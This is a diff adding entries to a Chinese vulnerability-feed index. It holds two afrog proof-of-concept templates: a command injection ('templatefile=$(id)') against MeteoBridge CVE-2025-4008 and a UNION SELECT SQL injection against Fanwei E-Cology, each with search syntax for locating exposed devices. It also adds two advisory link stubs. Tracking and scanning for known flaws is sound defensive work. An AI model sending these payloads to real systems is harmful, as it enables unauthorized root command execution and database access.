@@ -4,6 +4,114 @@
   
   
   <entry>
+    <title>MeteoBridge 远程代码执行漏洞</title>
+    <link href="/2025/06/12/github_2079400504/"/>
+    <url>/2025/06/12/github_2079400504/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> MeteoBridge 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-4008</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> MeteoBridge的web界面允许管理员通过CGI shell脚本和C编写的web应用程序管理其气象站数据收集和系统。该web界面暴露了一个易受命令注入攻击的端点。未经认证的远程攻击者可以在受影响的设备上以提升的权限（root）执行任意命令。</p><p><strong>产品厂商：</strong> Smartbedded</p><p><strong>产品名称：</strong> MeteoBridge</p><p><strong>影响版本：</strong> &lt;&#x3D; 6.1</p><p><strong>搜索语法：</strong> Meteobridge</p><p><strong>来源：</strong> <a href="https://github.com/zan8in/afrog/blob/5bd85fe90d8510c704c973bdcc9df539813feef3/pocs%2Ftemp%2Fafrog-pocs%2Fcve%2FCVE-2025-4008.yaml">https://github.com/zan8in/afrog/blob/5bd85fe90d8510c704c973bdcc9df539813feef3/pocs%2Ftemp%2Fafrog-pocs%2Fcve%2FCVE-2025-4008.yaml</a></p><p><strong>类型：</strong> zan8in&#x2F;afrog:github commit</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>5-<span class="hljs-number">4008</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> MeteoBridge <span class="hljs-operator">&lt;=</span> <span class="hljs-number">6.1</span> <span class="hljs-operator">-</span> Remote Code Execution<br>  <span class="hljs-params">author:</span> iamnoooob,pdresearch<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">description:</span> |<br>    The Meteobridge web interface <span class="hljs-keyword">let</span> meteobridge administrator manage their weather station data collection and administer their meteobridge system through a web application written <span class="hljs-keyword">in</span> CGI shell scripts and C.This web interface exposes an endpoint that is vulnerable to command injection.Remote unauthenticated attackers can gain arbitrary command execution <span class="hljs-keyword">with</span> elevated privileges ( root ) on affected devices.<br>    <span class="hljs-params">fofa:</span> <span class="hljs-string">&quot;Meteobridge&quot;</span><br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>forum.meteohub.de<span class="hljs-operator">/</span>viewtopic.php<span class="hljs-operator">?</span>t<span class="hljs-operator">=</span><span class="hljs-number">18687</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//www.onekey.com/resource/security-advisory-remote-command-execution-on-smartbedded-meteobridge-cve-2025-4008</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2025-4008</span><br>  <span class="hljs-params">tags:</span> cve,cve2025,meteobridge,rce<br>  <span class="hljs-params">created:</span> <span class="hljs-number">2025</span><span class="hljs-symbol">/06/12</span><br><br><span class="hljs-params">rules:</span><br>  <span class="hljs-params">r0:</span><br>    <span class="hljs-params">request:</span><br>      <span class="hljs-params">method:</span> GET<br>      <span class="hljs-params">path:</span> <span class="hljs-operator">/</span>public<span class="hljs-operator">/</span>template.cgi<span class="hljs-operator">?</span>templatefile<span class="hljs-operator">=</span>$(id)<br>    <span class="hljs-params">expression:</span> |<br>      response.status <span class="hljs-operator">==</span> <span class="hljs-number">200</span> <span class="hljs-operator">&amp;&amp;</span> response.body.bcontains(<span class="hljs-params">b&#x27;Error:</span> template file&#x27;) <span class="hljs-operator">&amp;&amp;</span> <span class="hljs-string">&quot;((u|g)id|groups)=[0-9]&#123;1,4&#125;<span class="hljs-char escape_">\\</span>([a-z0-9]+<span class="hljs-char escape_">\\</span>)&quot;</span>.bmatches(response.body)<br><span class="hljs-params">expression:</span> r0()<br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>命令执行</tag>
+      
+      <tag>zan8in/afrog:github commit</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞</title>
+    <link href="/2025/06/12/github_2373796174/"/>
+    <url>/2025/06/12/github_2373796174/</url>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> 泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞</p><p><strong>漏洞类型：</strong> SQL注入</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> 泛微OA HrmCareerApplyPerView.jsp文件存在SQL注入漏洞，攻击者通过漏洞可以读取服务器敏感文件</p><p><strong>产品厂商：</strong> 泛微</p><p><strong>产品名称：</strong> 泛微-协同办公OA</p><p><strong>搜索语法：</strong> app&#x3D;”泛微-协同办公OA”</p><p><strong>来源：</strong> <a href="https://github.com/zan8in/afrog/blob/5bd85fe90d8510c704c973bdcc9df539813feef3/pocs%2Ftemp%2Fafrog-pocs%2Fvulnerability%2Fe-cology-hrmcareerapplyperview-sqli.yaml">https://github.com/zan8in/afrog/blob/5bd85fe90d8510c704c973bdcc9df539813feef3/pocs%2Ftemp%2Fafrog-pocs%2Fvulnerability%2Fe-cology-hrmcareerapplyperview-sqli.yaml</a></p><p><strong>类型：</strong> zan8in&#x2F;afrog:github commit</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> e-cology-hrmcareerapplyperview-sqli<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> 泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞<br>  <span class="hljs-params">author:</span> zan8in<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">description:</span> |<br>    泛微OA HrmCareerApplyPerView.jsp文件存在SQL注入漏洞，攻击者通过漏洞可以读取服务器敏感文件<br>    <span class="hljs-attr">app</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;泛微-协同办公OA&quot;</span><br>  <span class="hljs-params">tags:</span> e-cology,sqli<br>  <span class="hljs-params">created:</span> <span class="hljs-number">2025</span><span class="hljs-symbol">/06/11</span><br><br><span class="hljs-params">set:</span><br>  <span class="hljs-params">randstr:</span> randLowercase(<span class="hljs-number">3</span>)<br>  <span class="hljs-params">md5str:</span> md5(randstr)<br><span class="hljs-params">rules:</span><br>  <span class="hljs-params">r0:</span><br>    <span class="hljs-params">request:</span><br>      <span class="hljs-params">method:</span> GET<br>      <span class="hljs-params">path:</span> <span class="hljs-operator">/</span>pweb<span class="hljs-operator">/</span>careerapply<span class="hljs-operator">/</span>HrmCareerApplyPerView.jsp<span class="hljs-operator">?</span>id<span class="hljs-operator">=</span><span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,sys.fn_sqlvarbasetostr(HashBytes(&#x27;MD5&#x27;,&#x27;&#123;&#123;randstr&#125;&#125;&#x27;)),db_name(<span class="hljs-number">1</span>),<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span><br>    <span class="hljs-params">expression:</span> response.status <span class="hljs-operator">==</span> <span class="hljs-number">200</span> <span class="hljs-operator">&amp;&amp;</span> response.body.bcontains(bytes(md5str))<br><span class="hljs-params">expression:</span> r0()<br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+    <categories>
+      
+      <category>Github Poc</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>SQL注入</tag>
+      
+      <tag>zan8in/afrog:github commit</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>国家安全机关通报重大失泄密事件｜恒脑30加持，让恶意邮件“潜伏者”无处遁形！</title>
+    <link href="/2025/06/12/weixin_2231262714/"/>
+    <url>/2025/06/12/weixin_2231262714/</url>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 安恒信息CERT</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/2Gh0qLY8s4fH9iDxaiOMvg">https://mp.weixin.qq.com/s/2Gh0qLY8s4fH9iDxaiOMvg</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>微信公众号</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>mp.weixin.qq.com</tag>
+      
+      <tag>安恒信息CERT</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
+    <title>【安全更新】微软6月安全更新多个产品高危漏洞通告</title>
+    <link href="/2025/06/12/weixin_3722105894/"/>
+    <url>/2025/06/12/weixin_3722105894/</url>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 绿盟科技CERT</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/wZ8wBhsYZ6iXStoe_YcAEg">https://mp.weixin.qq.com/s/wZ8wBhsYZ6iXStoe_YcAEg</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>微信公众号</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>mp.weixin.qq.com</tag>
+      
+      <tag>绿盟科技CERT</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>kk12-30/CVE-2025-27817</title>
     <link href="/2025/06/12/github_2883364378/"/>
     <url>/2025/06/12/github_2883364378/</url>
